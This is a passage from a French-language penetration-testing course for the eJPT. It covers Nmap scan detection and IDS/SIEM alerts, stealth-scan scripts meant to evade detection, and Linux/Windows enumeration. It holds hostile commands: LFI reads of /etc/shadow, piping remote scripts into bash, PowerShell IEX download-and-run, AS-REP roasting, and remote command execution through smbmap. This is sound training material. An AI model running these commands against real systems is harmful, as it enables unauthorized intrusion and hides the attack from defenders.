    xsltproc "$SCAN_FILE" -o "${SCAN_FILE%.xml}.html"
    echo "Rapport HTML généré: ${SCAN_FILE%.xml}.html"
fi
```

### Vue Blue Team / logs générés / alertes SIEM

Comprendre comment les activités de scan sont détectées est essentiel pour une approche OPSEC efficace.

#### Traces générées par les scans Nmap

1. **Logs de pare-feu**
   - Connexions bloquées ou autorisées
   - Tentatives de connexion sur plusieurs ports
   - Paquets avec des combinaisons de flags TCP inhabituelles

   **Exemple de log iptables :**
   ```
   May 15 14:23:45 server kernel: [12345.678901] IPTABLES: IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=192.168.1.100 DST=192.168.1.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=45678 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
   ```

2. **Logs IDS/IPS**
   - Signatures de scan Nmap
   - Détection de paquets fragmentés
   - Détection de scans de ports séquentiels

   **Exemple de log Snort :**
   ```
   [**] [1:1000001:1] NMAP TCP Scan [**]
   [Classification: Attempted Information Leak] [Priority: 2]
   05/15-14:23:45.123456 192.168.1.100:45678 -> 192.168.1.1:80
   TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:60
   ******S* Seq: 0x12345678 Ack: 0x0 Win: 0x1000 TcpLen: 40
   TCP Options (5) => MSS: 1460 SackOK TS: 12345678 0 NOP WS: 7
   ```

3. **Logs de service**
   - Tentatives de connexion multiples
   - Requêtes de version (bannières)
   - Erreurs d'application dues à des requêtes malformées

   **Exemple de log Apache :**
   ```
   192.168.1.100 - - [15/May/2023:14:23:45 +0200] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
   ```

#### Mécanismes de détection

1. **Détection basée sur les signatures**
   - Reconnaissance de patterns connus (User-Agent Nmap)
   - Séquences de ports spécifiques
   - Combinaisons de flags TCP inhabituelles

2. **Détection basée sur les anomalies**
   - Volume inhabituel de connexions
   - Connexions à des ports non utilisés
   - Timing régulier entre les requêtes

3. **Corrélation d'événements**
   - Association de multiples tentatives de connexion
   - Reconnaissance de phases de scan (découverte, énumération)
   - Détection de progression logique (scan puis exploitation)

#### Alertes SIEM typiques

**Alerte de scan de ports :**
```
[ALERT] Port Scan Detected
Source IP: 192.168.1.100
Target IP: 192.168.1.1
Time: 2023-05-15 14:23:45
Details: Multiple connection attempts to different ports (22,23,25,80,443,445) within 5 seconds
Severity: Medium
```

**Alerte de scan de vulnérabilité :**
```
[ALERT] Vulnerability Scanner Activity Detected
Source IP: 192.168.1.100
Target IP: 192.168.1.1
Time: 2023-05-15 14:30:12
Details: Nmap script scan signatures detected on HTTP service
Severity: High
```

**Alerte de scan furtif :**
```
[ALERT] Stealth Scan Detected
Source IP: 192.168.1.100
Target IP: 192.168.1.1
Time: 2023-05-15 14:35:27
Details: NULL/FIN/XMAS scan detected (unusual TCP flags)
Severity: High
```

### Pièges classiques et erreurs à éviter

#### Erreurs techniques

1. **Scan incomplet**
   - Limitation aux ports par défaut (top 1000)
   - Oubli des ports UDP
   - Non-vérification des résultats "filtered"

2. **Interprétation incorrecte**
   - Confusion entre "filtered" et "closed"
   - Faux positifs dans la détection de version
   - Confiance excessive dans la détection d'OS

3. **Problèmes de performance**
   - Scan trop agressif causant des timeouts
   - Scan trop lent devenant obsolète
   - Utilisation excessive de ressources réseau

#### Erreurs OPSEC

1. **Signature évidente**
   - Utilisation des options par défaut facilement détectables
   - User-Agent Nmap non modifié
   - Scan depuis une adresse IP directement attribuable

2. **Comportement prévisible**
   - Scan séquentiel des ports (1,2,3,4...)
   - Timing régulier entre les requêtes
   - Progression logique des phases de scan

3. **Bruit excessif**
   - Scan trop rapide (-T4, -T5)
   - Utilisation de --script vuln sans nécessité
   - Scan simultané de nombreuses cibles

### OPSEC Tips : réduction de la détectabilité des scans

#### Techniques de base

1. **Ralentissement des scans**
   ```bash
   # Scan très lent
   sudo nmap -T1 --scan-delay 5s 192.168.1.1
   ```

2. **Randomisation**
   ```bash
   # Ordre aléatoire des ports
   sudo nmap --randomize-hosts --script-args http.useragent="Mozilla/5.0" 192.168.1.0/24
   
   # Ordre aléatoire des hôtes
   sudo nmap --randomize-hosts 192.168.1.0/24
   ```

3. **Limitation de la portée**
   ```bash
   # Scan ciblé des ports les plus intéressants
   sudo nmap -p 22,80,443,445,3389 192.168.1.1
   ```

#### Techniques avancées

1. **Modification des signatures**
   ```bash
   # Changement du User-Agent pour les scripts
   sudo nmap --script-args http.useragent="Mozilla/5.0" 192.168.1.1
   
   # Modification de la taille des paquets
   sudo nmap --data-length 25 192.168.1.1
   ```

2. **Distribution temporelle**
   ```bash
   # Scan réparti sur une longue période
   for port in 22 80 443 445 3389; do
       sudo nmap -p $port 192.168.1.1
       sleep $((RANDOM % 60 + 30))
   done
   ```

3. **Utilisation de proxies**
   ```bash
   # Scan via proxychains
   sudo proxychains nmap -sT 192.168.1.1
   # Note: -sT obligatoire car proxychains ne supporte pas les raw packets
   ```

#### Script d'automatisation OPSEC

Voici un exemple de script pour réaliser un scan discret :

```bash
#!/bin/bash
# stealth_scan.sh - Scan Nmap discret avec techniques OPSEC

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target> [output_file]"
    exit 1
fi

TARGET=$1
OUTPUT=${2:-"stealth_scan_$(date +%Y%m%d_%H%M%S)"}

echo "[+] Démarrage du scan discret sur $TARGET"
echo "[+] Les résultats seront enregistrés dans $OUTPUT.*"

# Phase 1: Découverte d'hôtes discrète
echo "[*] Phase 1: Découverte d'hôtes..."
sudo nmap -T2 -sn -PE -PP -PS22,80,443 -PA22,80,443 -n --randomize-hosts \
     --data-length $((RANDOM % 10 + 10)) $TARGET -oA "${OUTPUT}_hosts"

# Extraction des hôtes actifs
ACTIVE_HOSTS=$(grep "Status: Up" "${OUTPUT}_hosts.gnmap" | cut -d " " -f 2)

if [ -z "$ACTIVE_HOSTS" ]; then
    echo "[-] Aucun hôte actif détecté. Fin du scan."
    exit 0
fi

echo "[+] Hôtes actifs détectés: $(echo $ACTIVE_HOSTS | wc -w)"

# Phase 2: Scan de ports TCP courants
echo "[*] Phase 2: Scan de ports TCP courants..."
for host in $ACTIVE_HOSTS; do
    echo "[*] Scan de $host..."
    sudo nmap -T2 -sS -n --randomize-ports --data-length $((RANDOM % 15 + 5)) \
         -PS22,80,443 --source-port $((RANDOM % 20000 + 40000)) \
         -p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,464,587,636,1433,3306,3389,5985,5986 \
         $host -oA "${OUTPUT}_${host//./_}_tcp_common"
    
    # Pause aléatoire entre 10 et 30 secondes
    sleep $((RANDOM % 20 + 10))
done

# Phase 3: Scan de version sur les ports ouverts
echo "[*] Phase 3: Détection de version sur les ports ouverts..."
for host in $ACTIVE_HOSTS; do
    # Extraction des ports ouverts
    OPEN_PORTS=$(grep "open" "${OUTPUT}_${host//./_}_tcp_common.gnmap" | \
                grep -oP '\d+/open' | cut -d "/" -f 1 | tr '\n' ',' | sed 's/,$//')
    
    if [ -n "$OPEN_PORTS" ]; then
        echo "[*] Détection de version sur $host (ports: $OPEN_PORTS)..."
        sudo nmap -T2 -sV --version-intensity 4 -n --script-args http.useragent="Mozilla/5.0" \
             --source-port $((RANDOM % 20000 + 40000)) -p $OPEN_PORTS \
             $host -oA "${OUTPUT}_${host//./_}_versions"
    fi
    
    # Pause aléatoire entre 15 et 45 secondes
    sleep $((RANDOM % 30 + 15))
done

echo "[+] Scan discret terminé. Résultats disponibles dans les fichiers $OUTPUT.*"
```

### Points clés

- Nmap est l'outil de référence pour le scan de réseau, offrant une multitude d'options pour différents scénarios.
- Les scans TCP SYN (-sS) sont généralement le meilleur compromis entre information et discrétion.
- Le timing est crucial : les scans rapides (-T4, -T5) sont détectables, les scans lents (-T1, -T2) sont plus discrets.
- Les techniques de contournement de pare-feu (fragmentation, modification de taille) peuvent aider à éviter la détection.
- L'exportation au format XML facilite l'analyse automatisée et l'intégration avec d'autres outils.
- Les scans Nmap génèrent des traces détectables par les pare-feu, IDS/IPS et SIEM.
- Une approche OPSEC efficace implique de ralentir les scans, randomiser les cibles et modifier les signatures.

### Mini-quiz (3 QCM)

1. **Quelle option Nmap est la plus discrète pour scanner un réseau ?**
   - A) `-sT -T5`
   - B) `-sS -T1 --data-length 15`
   - C) `-sA -T3`
   - D) `-sV -A --script vuln`

   *Réponse : B*

2. **Quelle affirmation est correcte concernant les scans UDP avec Nmap ?**
   - A) Ils sont plus rapides que les scans TCP
   - B) Ils ne nécessitent pas de privilèges root
   - C) Ils sont souvent incomplets car de nombreux ports ne répondent pas
   - D) Ils sont détectés moins facilement que les scans TCP

   *Réponse : C*

3. **Quelle technique n'aide PAS à contourner un pare-feu ou un IDS ?**
   - A) Fragmentation des paquets (-f)
   - B) Modification de la taille des paquets (--data-length)
   - C) Scan agressif (-A)
   - D) Utilisation de ports source spécifiques (--source-port)

   *Réponse : C*

### Lab/Exercice guidé : Scan furtif d'un réseau

#### Objectif
Réaliser un scan complet d'un réseau cible en utilisant des techniques OPSEC pour minimiser la détection.

#### Prérequis
- Kali Linux
- Accès réseau à la cible (environnement de laboratoire)
- Privilèges root pour exécuter Nmap

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/stealth_scan
cd ~/pentest_labs/stealth_scan

# Création du script de scan furtif
cat > stealth_scan.sh << 'EOF'
#!/bin/bash
# Script de scan furtif

TARGET=$1
OUTPUT_DIR=$2

# Vérification des arguments
if [ -z "$TARGET" ] || [ -z "$OUTPUT_DIR" ]; then
    echo "Usage: $0 <target> <output_directory>"
    exit 1
fi

# Création du répertoire de sortie
mkdir -p "$OUTPUT_DIR"

echo "[+] Démarrage du scan furtif sur $TARGET"
echo "[+] Résultats dans $OUTPUT_DIR"

# Phase 1: Découverte d'hôtes discrète
echo "[*] Phase 1: Découverte d'hôtes..."
sudo nmap -T2 -sn -PE -PP -n --randomize-hosts \
     --data-length 15 "$TARGET" -oA "$OUTPUT_DIR/01_host_discovery"

# Extraction des hôtes actifs
ACTIVE_HOSTS=$(grep "Status: Up" "$OUTPUT_DIR/01_host_discovery.gnmap" | cut -d " " -f 2)

if [ -z "$ACTIVE_HOSTS" ]; then
    echo "[-] Aucun hôte actif détecté."
    exit 0
fi

echo "[+] Hôtes actifs: $(echo $ACTIVE_HOSTS | wc -w)"

# Phase 2: Scan TCP discret des ports courants
echo "[*] Phase 2: Scan TCP discret..."
for host in $ACTIVE_HOSTS; do
    echo "[*] Scan de $host..."
    sudo nmap -T2 -sS -n --randomize-ports -f --data-length 10 \
         -p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,3306,3389,5985 \
         "$host" -oA "$OUTPUT_DIR/02_tcp_${host//./_}"
    
    # Pause aléatoire
    sleep $((RANDOM % 10 + 5))
done

# Phase 3: Scan UDP discret des ports essentiels
echo "[*] Phase 3: Scan UDP discret..."
for host in $ACTIVE_HOSTS; do
    echo "[*] Scan UDP de $host..."
    sudo nmap -T2 -sU -n --randomize-ports \
         -p 53,67,68,69,123,161,162,500,514,1900 \
         "$host" -oA "$OUTPUT_DIR/03_udp_${host//./_}"
    
    # Pause aléatoire
    sleep $((RANDOM % 10 + 5))
done

# Phase 4: Détection de version discrète
echo "[*] Phase 4: Détection de version..."
for host in $ACTIVE_HOSTS; do
    # Extraction des ports TCP ouverts
    TCP_OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/02_tcp_${host//./_}.gnmap" | \
                    grep -oP '\d+/open/tcp' | cut -d "/" -f 1 | tr '\n' ',' | sed 's/,$//')
    
    # Extraction des ports UDP ouverts
    UDP_OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/03_udp_${host//./_}.gnmap" | \
                    grep -oP '\d+/open/udp' | cut -d "/" -f 1 | tr '\n' ',' | sed 's/,$//')
    
    # Scan de version TCP
    if [ -n "$TCP_OPEN_PORTS" ]; then
        echo "[*] Détection de version TCP sur $host..."
        sudo nmap -T2 -sV --version-intensity 2 -n \
             --script-args http.useragent="Mozilla/5.0" \
             -p "$TCP_OPEN_PORTS" "$host" \
             -oA "$OUTPUT_DIR/04_versions_tcp_${host//./_}"
        
        sleep $((RANDOM % 10 + 5))
    fi
    
    # Scan de version UDP
    if [ -n "$UDP_OPEN_PORTS" ]; then
        echo "[*] Détection de version UDP sur $host..."
        sudo nmap -T2 -sUV --version-intensity 2 -n \
             -p "$UDP_OPEN_PORTS" "$host" \
             -oA "$OUTPUT_DIR/05_versions_udp_${host//./_}"
        
        sleep $((RANDOM % 10 + 5))
    fi
done

# Phase 5: Génération du rapport
echo "[*] Phase 5: Génération du rapport..."

# Création d'un rapport de synthèse
cat > "$OUTPUT_DIR/scan_summary.txt" << EOL
# Rapport de scan furtif
Date: $(date)
Cible: $TARGET

## Hôtes actifs
$(echo "$ACTIVE_HOSTS" | tr ' ' '\n')

## Détail des services par hôte
EOL

for host in $ACTIVE_HOSTS; do
    echo "### Hôte: $host" >> "$OUTPUT_DIR/scan_summary.txt"
    echo "#### Services TCP" >> "$OUTPUT_DIR/scan_summary.txt"
    grep "open" "$OUTPUT_DIR/04_versions_tcp_${host//./_}.nmap" | \
        grep -v "filtered" >> "$OUTPUT_DIR/scan_summary.txt" || \
        echo "Aucun service TCP détecté" >> "$OUTPUT_DIR/scan_summary.txt"
    
    echo "#### Services UDP" >> "$OUTPUT_DIR/scan_summary.txt"
    grep "open" "$OUTPUT_DIR/05_versions_udp_${host//./_}.nmap" | \
        grep -v "filtered" >> "$OUTPUT_DIR/scan_summary.txt" || \
        echo "Aucun service UDP détecté" >> "$OUTPUT_DIR/scan_summary.txt"
    
    echo "" >> "$OUTPUT_DIR/scan_summary.txt"
done

echo "[+] Scan furtif terminé. Rapport disponible dans $OUTPUT_DIR/scan_summary.txt"
EOF

# Rendre le script exécutable
chmod +x stealth_scan.sh
```

2. **Exécution du scan furtif**

```bash
# Remplacez 192.168.1.0/24 par votre réseau cible
./stealth_scan.sh 192.168.1.0/24 scan_results
```

3. **Analyse des résultats**

```bash
# Affichage du rapport de synthèse
cat scan_results/scan_summary.txt

# Analyse des hôtes découverts
grep "Status: Up" scan_results/01_host_discovery.gnmap

# Analyse des services détectés
grep "open" scan_results/04_versions_tcp_*.nmap
```

4. **Comparaison avec un scan standard**

```bash
# Scan standard pour comparaison
sudo nmap -sV 192.168.1.0/24 -oA scan_standard

# Comparaison des temps d'exécution
ls -la scan_results/01_host_discovery.nmap scan_standard.nmap
```

#### Vue Blue Team

Dans un environnement réel, les différences de détection entre un scan standard et un scan furtif seraient significatives :

1. **Scan standard**
   - Génère de nombreuses alertes IDS/IPS
   - Apparaît clairement dans les logs de pare-feu
   - Crée des pics de trafic évidents
   - Signature Nmap facilement reconnaissable

2. **Scan furtif**
   - Répartit les connexions dans le temps
   - Utilise des techniques d'évasion (fragmentation, taille variable)
   - Évite les signatures évidentes
   - Se confond davantage avec le trafic normal

**Exemple de différence dans les logs :**

*Alerte IDS pour scan standard :*
```
[CRITICAL] Port Scan Attack Detected
Source: 192.168.1.100
Target: Multiple hosts
Time: 2023-05-15 15:30:45
Details: 1000+ connection attempts in 30 seconds, Nmap signature detected
```

*Alerte IDS pour scan furtif (si détecté) :*
```
[LOW] Suspicious Connection Pattern
Source: 192.168.1.100
Target: 192.168.1.1
Time: 2023-05-15 15:30:45 - 15:45:12
Details: Unusual connection pattern to uncommon ports
```

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir réalisé un scan réseau complet avec des techniques OPSEC
- Comprendre les différences entre un scan standard et un scan furtif
- Être capable d'adapter les techniques de scan selon le contexte
- Avoir obtenu un rapport détaillé des hôtes et services du réseau cible
- Apprécier l'importance du timing et de la randomisation dans les activités de reconnaissance
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 5 : Énumération Linux & Windows

### Introduction : Pourquoi ce thème est important

L'énumération est une phase critique du pentesting qui consiste à recueillir des informations détaillées sur les systèmes cibles après avoir identifié les hôtes actifs et les services disponibles. Cette étape permet de découvrir les vulnérabilités potentielles, les mauvaises configurations et les vecteurs d'attaque possibles. Une énumération efficace fait souvent la différence entre un test d'intrusion réussi et un échec. Ce chapitre vous enseignera les techniques et outils d'énumération pour les systèmes Linux et Windows, tout en intégrant les considérations OPSEC pour minimiser la détection de vos activités par les équipes défensives.

### Énumération Linux : services, utilisateurs, fichiers sensibles

L'énumération des systèmes Linux nécessite une approche méthodique pour identifier les informations critiques qui pourraient être exploitées ultérieurement.

#### Énumération des services Linux

Les services en cours d'exécution peuvent révéler des vecteurs d'attaque potentiels.

1. **Énumération SSH (port 22)**

```bash
# Vérification de la bannière SSH
nc -nv 192.168.1.10 22

# Énumération des algorithmes supportés
nmap --script ssh2-enum-algos -p 22 192.168.1.10

# Vérification des méthodes d'authentification
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.1.10

# Tentative d'énumération d'utilisateurs (si configuré pour le permettre)
python3 /usr/share/exploitdb/exploits/linux/remote/45233.py 192.168.1.10 22 root
```

2. **Énumération FTP (port 21)**

```bash
# Vérification de la bannière FTP
nc -nv 192.168.1.10 21

# Test d'accès anonyme
ftp 192.168.1.10
# Utiliser "anonymous" comme nom d'utilisateur et une adresse email comme mot de passe

# Énumération avec Nmap
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor -p 21 192.168.1.10
```

3. **Énumération HTTP/HTTPS (ports 80/443)**

```bash
# Identification du serveur web
curl -I http://192.168.1.10

# Énumération des répertoires
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

# Recherche de fichiers sensibles
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old,xml,conf

# Scan avec Nikto
nikto -h http://192.168.1.10
```

4. **Énumération SMB/Samba (ports 139/445)**

```bash
# Énumération des partages
smbclient -L //192.168.1.10 -N

# Vérification de l'accès null session
smbclient //192.168.1.10/IPC$ -N

# Énumération complète avec enum4linux-ng
enum4linux-ng -a 192.168.1.10
```

5. **Énumération NFS (port 2049)**

```bash
# Liste des partages NFS
showmount -e 192.168.1.10

# Tentative de montage
mkdir /tmp/nfs
mount -t nfs 192.168.1.10:/partage /tmp/nfs
ls -la /tmp/nfs
```

#### Énumération des utilisateurs et groupes

Identifier les utilisateurs peut révéler des cibles potentielles pour des attaques de mot de passe ou d'élévation de privilèges.

1. **Énumération via Finger (port 79)**

```bash
# Vérification si le service finger est actif
nc -nv 192.168.1.10 79

# Énumération d'utilisateurs
finger @192.168.1.10
finger root@192.168.1.10
```

2. **Énumération SMTP (port 25)**

```bash
# Connexion au service SMTP
nc -nv 192.168.1.10 25

# Commandes SMTP pour énumérer les utilisateurs
HELO test.com
VRFY root
VRFY admin
EXPN users
```

3. **Énumération via SNMP (port 161)**

```bash
# Vérification des community strings par défaut
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.10

# Énumération des utilisateurs via SNMP
snmpwalk -c public -v1 192.168.1.10 1.3.6.1.4.1.77.1.2.25
```

#### Énumération des fichiers sensibles

Les fichiers sensibles peuvent contenir des informations précieuses comme des identifiants ou des configurations vulnérables.

1. **Recherche de fichiers de configuration**

```bash
# Si vous avez un accès au système
find / -name "*.conf" -o -name "*.config" -o -name "*.xml" 2>/dev/null

# Via une application web vulnérable (LFI)
curl http://192.168.1.10/vuln.php?file=/etc/passwd
curl http://192.168.1.10/vuln.php?file=/etc/shadow
curl http://192.168.1.10/vuln.php?file=/etc/hosts
```

2. **Recherche de fichiers de sauvegarde**

```bash
find / -name "*.bak" -o -name "*.old" -o -name "*~" 2>/dev/null
```

3. **Recherche de fichiers avec SUID/SGID**

```bash
# Recherche de binaires SUID
find / -perm -u=s -type f 2>/dev/null

# Recherche de binaires SGID
find / -perm -g=s -type f 2>/dev/null
```

### Énumération Windows : services, utilisateurs, partages

L'énumération des systèmes Windows nécessite des techniques et outils spécifiques en raison des différences fondamentales avec les systèmes Linux.

#### Énumération des services Windows

1. **Énumération SMB (ports 139/445)**

```bash
# Énumération avec enum4linux-ng
enum4linux-ng -A 192.168.1.20

# Énumération des partages
smbclient -L //192.168.1.20 -U ""

# Vérification des vulnérabilités SMB
nmap --script smb-vuln* -p 139,445 192.168.1.20
```

2. **Énumération RPC (port 135)**

```bash
# Connexion au service RPC
rpcclient -U "" 192.168.1.20

# Commandes utiles dans rpcclient
srvinfo       # Informations sur le serveur
enumdomusers  # Énumération des utilisateurs du domaine
enumdomgroups # Énumération des groupes du domaine
getdompwinfo  # Informations sur la politique de mot de passe
```

3. **Énumération WMI (port 5985/5986)**

```bash
# Vérification si WinRM est actif
nmap -p 5985,5986 192.168.1.20

# Tentative de connexion avec Evil-WinRM (si vous avez des identifiants)
evil-winrm -i 192.168.1.20 -u Administrateur -p "MotDePasse123"
```

4. **Énumération LDAP (port 389)**

```bash
# Recherche d'informations LDAP
ldapsearch -x -h 192.168.1.20 -s base namingcontexts

# Énumération des utilisateurs
ldapsearch -x -h 192.168.1.20 -b "DC=lab,DC=local" "(objectClass=user)"

# Énumération des groupes
ldapsearch -x -h 192.168.1.20 -b "DC=lab,DC=local" "(objectClass=group)"
```

#### Énumération des utilisateurs et groupes Windows

1. **Énumération via SMB**

```bash
# Énumération des utilisateurs avec enum4linux-ng
enum4linux-ng -U 192.168.1.20

# Énumération via rpcclient
rpcclient -U "" 192.168.1.20
rpcclient $> enumdomusers
rpcclient $> queryuser 0x3e8
```

2. **Énumération via SNMP**

```bash
# Énumération des utilisateurs via SNMP
snmpwalk -c public -v1 192.168.1.20 1.3.6.1.4.1.77.1.2.25

# Énumération des processus
snmpwalk -c public -v1 192.168.1.20 1.3.6.1.2.1.25.4.2.1.2
```

3. **Énumération Kerberos (port 88)**

```bash
# Énumération des utilisateurs via Kerbrute
kerbrute userenum --dc 192.168.1.20 -d lab.local /usr/share/wordlists/seclists/Usernames/Names/names.txt

# AS-REP Roasting (si Kerberos Pre-Auth est désactivé pour certains utilisateurs)
GetNPUsers.py lab.local/ -usersfile users.txt -dc-ip 192.168.1.20
```

#### Énumération des partages et fichiers

1. **Énumération des partages SMB**

```bash
# Liste des partages
smbmap -H 192.168.1.20

# Vérification des permissions
smbmap -H 192.168.1.20 -u "guest" -p ""

# Recherche récursive de fichiers
smbmap -H 192.168.1.20 -u "username" -p "password" -R
```

2. **Accès aux partages**

```bash
# Connexion à un partage
smbclient //192.168.1.20/ADMIN$ -U "Administrateur"

# Montage d'un partage (si autorisé)
mount -t cifs //192.168.1.20/SHARE /mnt/windows -o username=Utilisateur
```

3. **Recherche de fichiers sensibles**

```bash
# Si vous avez un accès au système
# Recherche de fichiers de configuration
dir /s *.xml *.config *.ini *.txt *.cfg

# Recherche de fichiers contenant des mots de passe
findstr /si password *.xml *.ini *.txt *.config *.cfg
```

### Outils spécialisés : enum4linux-ng, RPCclient, SMBmap

#### enum4linux-ng

enum4linux-ng est une réécriture moderne de l'outil enum4linux original, offrant une énumération complète des systèmes Windows et Samba.

1. **Installation**

```bash
# Sur Kali Linux
sudo apt update
sudo apt install -y enum4linux-ng

# Ou installation depuis GitHub
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

2. **Utilisation de base**

```bash
# Énumération complète
enum4linux-ng -A 192.168.1.20

# Options spécifiques
-U    # Énumération des utilisateurs
-G    # Énumération des groupes
-S    # Énumération des partages
-P    # Politique de mot de passe
-O    # Information sur le système d'exploitation
```

3. **Exemple d'utilisation avancée**

```bash
# Énumération avec identifiants
enum4linux-ng -A -u "Utilisateur" -p "MotDePasse" 192.168.1.20

# Sortie JSON pour traitement automatisé
enum4linux-ng -A -oJ enum_results.json 192.168.1.20
```

#### RPCclient

RPCclient est un outil de ligne de commande pour exécuter des fonctions MS-RPC côté client.

1. **Connexion de base**

```bash
# Connexion anonyme
rpcclient -U "" 192.168.1.20

# Connexion avec identifiants
rpcclient -U "DOMAINE\\Utilisateur%MotDePasse" 192.168.1.20
```

2. **Commandes utiles**

```bash
# Informations sur le serveur
srvinfo

# Énumération des utilisateurs
enumdomusers
queryuser <RID>

# Énumération des groupes
enumdomgroups
querygroup <RID>

# Politique de mot de passe
getdompwinfo

# Informations sur le domaine
lsaquery
dsroledominfo
```

3. **Exemple d'utilisation avancée**

```bash
# Script pour énumérer tous les utilisateurs et leurs détails
for i in $(rpcclient -U "" 192.168.1.20 -c "enumdomusers" | grep -oP '\[.*?\]' | tr -d '[]'); do
    rpcclient -U "" 192.168.1.20 -c "queryuser $i"
done
```

#### SMBmap

SMBmap permet d'énumérer les partages SMB et les permissions associées.

1. **Installation**

```bash
# Sur Kali Linux
sudo apt update
sudo apt install -y smbmap

# Ou installation depuis GitHub
git clone https://github.com/ShawnDEvans/smbmap.git
cd smbmap
pip3 install -r requirements.txt
```

2. **Utilisation de base**

```bash
# Énumération des partages
smbmap -H 192.168.1.20

# Énumération avec identifiants
smbmap -H 192.168.1.20 -u "Utilisateur" -p "MotDePasse" -d "DOMAINE"
```

3. **Fonctionnalités avancées**

```bash
# Recherche récursive de fichiers
smbmap -H 192.168.1.20 -u "Utilisateur" -p "MotDePasse" -R

# Recherche de fichiers spécifiques
smbmap -H 192.168.1.20 -u "Utilisateur" -p "MotDePasse" -R -A "*.txt"

# Exécution de commandes (si autorisé)
smbmap -H 192.168.1.20 -u "Utilisateur" -p "MotDePasse" -x "ipconfig /all"

# Téléchargement de fichiers
smbmap -H 192.168.1.20 -u "Utilisateur" -p "MotDePasse" --download "C$\Users\Administrator\Desktop\secret.txt"
```

### Automatisation de l'énumération

L'automatisation de l'énumération permet de gagner du temps et d'assurer une couverture complète des cibles.

#### Scripts d'énumération Linux

1. **LinEnum**

LinEnum est un script bash qui effectue une énumération approfondie des systèmes Linux.

```bash
# Téléchargement
git clone https://github.com/rebootuser/LinEnum.git

# Exécution locale
./LinEnum.sh

# Exécution à distance (si vous avez un shell)
curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

2. **LinPEAS**

LinPEAS est un script qui recherche les chemins d'élévation de privilèges possibles.

```bash
# Téléchargement
git clone https://github.com/carlospolop/PEASS-ng.git

# Exécution locale
./linpeas.sh

# Exécution à distance
curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | bash
```

#### Scripts d'énumération Windows

1. **WinPEAS**

WinPEAS est l'équivalent Windows de LinPEAS.

```bash
# Téléchargement
git clone https://github.com/carlospolop/PEASS-ng.git

# Exécution (après transfert sur la cible)
winpeas.exe

# Exécution à distance via PowerShell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')"
```

2. **PowerView**

PowerView est un module PowerShell pour l'énumération des domaines Active Directory.

```powershell
# Importation du module
Import-Module .\PowerView.ps1

# Énumération des utilisateurs du domaine
Get-DomainUser

# Énumération des groupes du domaine
Get-DomainGroup

# Énumération des ordinateurs du domaine
Get-DomainComputer

# Recherche de sessions actives
Get-NetSession -ComputerName "DC01"
```

#### Création d'un script d'énumération personnalisé

Voici un exemple de script bash personnalisé pour automatiser l'énumération d'une cible Linux :

```bash
#!/bin/bash
# enum_target.sh - Script d'énumération automatisée

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TARGET=$1
OUTPUT_DIR="enum_${TARGET//./}_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"
echo "[+] Résultats sauvegardés dans $OUTPUT_DIR"

# Fonction pour enregistrer les résultats
log_cmd() {
    local cmd=$1
    local outfile=$2
    echo "[*] Exécution de: $cmd"
    eval "$cmd" > "$OUTPUT_DIR/$outfile" 2>&1
    echo "[+] Résultats enregistrés dans $OUTPUT_DIR/$outfile"
}

# Scan Nmap initial
echo "[*] Scan Nmap initial..."
log_cmd "nmap -sV -sC -p- $TARGET" "01_nmap_full.txt"

# Extraction des ports ouverts
OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/01_nmap_full.txt" | grep -v "filtered" | cut -d "/" -f 1)

# Énumération par service
for port in $OPEN_PORTS; do
    case $port in
        21)
            echo "[*] Énumération FTP (port 21)..."
            log_cmd "nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor -p 21 $TARGET" "02_ftp_enum.txt"
            ;;
        22)
            echo "[*] Énumération SSH (port 22)..."
            log_cmd "nmap --script ssh2-enum-algos,ssh-auth-methods -p 22 $TARGET" "03_ssh_enum.txt"
            ;;
        25)
            echo "[*] Énumération SMTP (port 25)..."
            log_cmd "nmap --script smtp-commands,smtp-enum-users,smtp-vuln* -p 25 $TARGET" "04_smtp_enum.txt"
            ;;
        80|443)
            proto="http"
            [[ $port -eq 443 ]] && proto="https"
            echo "[*] Énumération Web (port $port)..."
            log_cmd "nikto -h $proto://$TARGET:$port" "05_nikto_$port.txt"
            log_cmd "gobuster dir -u $proto://$TARGET:$port -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak" "06_gobuster_$port.txt"
            ;;
        139|445)
            echo "[*] Énumération SMB (port $port)..."
            log_cmd "enum4linux-ng -A $TARGET" "07_enum4linux.txt"
            log_cmd "smbmap -H $TARGET" "08_smbmap.txt"
            ;;
        161)
            echo "[*] Énumération SNMP (port 161)..."
            log_cmd "onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $TARGET" "09_snmp_community.txt"
            log_cmd "snmpwalk -c public -v1 $TARGET" "10_snmpwalk.txt"
            ;;
        1433)
